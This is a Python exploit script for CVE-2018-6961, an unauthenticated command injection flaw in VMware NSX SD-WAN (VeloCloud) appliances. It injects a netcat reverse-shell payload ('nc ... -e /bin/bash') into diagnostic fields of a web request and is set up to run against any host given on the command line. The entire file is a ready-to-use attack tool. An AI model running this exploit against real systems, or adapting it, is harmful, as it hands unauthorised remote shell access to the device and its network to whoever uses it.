#!/usr/bin/env python3
import argparse
import requests
import sys
import collections
import subprocess

'''
# Exploit Title: Unauthenticated Command Injection vulnerability in VMware NSX SD-WAN by VeloCloud
# Date: 2018-06-29
# Original Exploit Author: paragonsec @ Critical Start
# Python3 Exploit : R3dxpl0it
# Credit: Brian Sullivan from Tevora and Section 8 @ Critical Start
# Vendor Homepage: https://www.vmware.com
# Security Advisory: https://www.vmware.com/security/advisories/VMSA-2018-0011.html
# Version: 3.1.1 
# CVE: CVE-2018-6961
'''



def exploit():
        payload = "$(nc " + args.lhost + " " + args.lport + " -e /bin/bash)"
        url = "http://" + args.rhost + "/scripts/ajaxPortal.lua"
        headers = [('User-Agent','Mozilla/5.0 (X11; Linux i686; rv:52.0)(Gecko/20100101 Firefox/52.0'),
        ('Accept', 'application/json, text/javascript, */*; q=0.01'),
        ('Accept-Language', 'en-US,en;q=0.5'),
        ('Accept-Encoding', 'gzip, deflate'),
        ('Referer','http://' + args.rhost + '/'),
        ('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8'),
        ('X-Requested-With', 'XMLHttpRequest'),('Cookie', 'culture=en-us'),
        ('Connection', 'close')]
        headers = collections.OrderedDict(headers)

        if args.function == 'traceroute':
            craftdata = "destination=8.8.8.8" + payload + "&source=" + args.interface + "&test=TRACEROUTE&requestTimeout=900&auth_token=&_cmd=run_diagnostic"
        elif args.function == 'dns':
            craftdata = "name=google.com" + payload + "&test=DNS_TEST&requestTimeout=90&auth_token=&_cmd=run_diagnostic"
        else:
            craftdata = "destination=8.8.8.8" + payload + "&source=" + args.interface + "&test=BASIC_PING&requestTimeout=90&auth_token=&_cmd=run_diagnostic"
        print ("Sending Session Request")
        try :            
            session = requests.Session()
            sendpost = requests.post(url, headers=headers, data=craftdata)
         
            if (sendpost.status_code == 200):
                print ("Success")
            else:
                print ("Failed With Status Code : ", sendpost.status_code)
        except Exception as e : 
            print(e)
            quit()
if __name__ == "__main__" : 
    
    parser = argparse.ArgumentParser(usage='''python exploit.py --rhost <REMOTE HOST> --interface <INTERFACE> --lhost <LOCAL HOST> --lport <LOCALPORT> --function <fUNCTION>''' )
    parser.add_argument("--rhost", help = "Remote Host" , required = True )
    parser.add_argument("--interface", help = "Interface that has Internet Access (Example: Eth0, ge1, ge1.401, ge2, ge2.2000)" , required = True )
    parser.add_argument('--lhost', help = 'Local Host' , required = True )
    parser.add_argument('--lport', help = 'Local Port' , required = True )
    parser.add_argument('--function', help = 'Function to abuse (example: traceroute, dns, ping)' , required = True )
    args = parser.parse_args()
    exploit()